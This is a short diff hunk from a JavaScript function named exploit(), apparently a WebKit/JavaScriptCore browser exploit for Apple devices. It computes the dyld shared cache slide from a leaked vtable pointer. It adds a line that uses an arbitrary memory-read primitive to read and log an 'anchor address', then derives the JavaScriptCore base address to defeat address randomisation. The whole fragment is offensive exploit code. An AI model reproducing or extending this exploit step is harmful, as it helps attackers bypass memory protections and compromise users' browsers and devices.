@@ -483,6 +483,9 @@ function exploit(){
 	    var ccc = 0;
 	    var vtab = 0x1B205A808;
 	    var slide = Sub(v_tlb, vtab); 
+	    var anchor = memory.read_i64(v_tlb,0)
+	    log('[+] Anchor address is' + anchor.toString(16));
+	    
 	    log('[+] That means that the dyld shared cache slide should be '+slide.toString(16));
 	    var base = Add(new Int64('0x1881BD000'), slide);
 	    log('[+] And thus the JavaScriptCore base is '+base.toString(16));
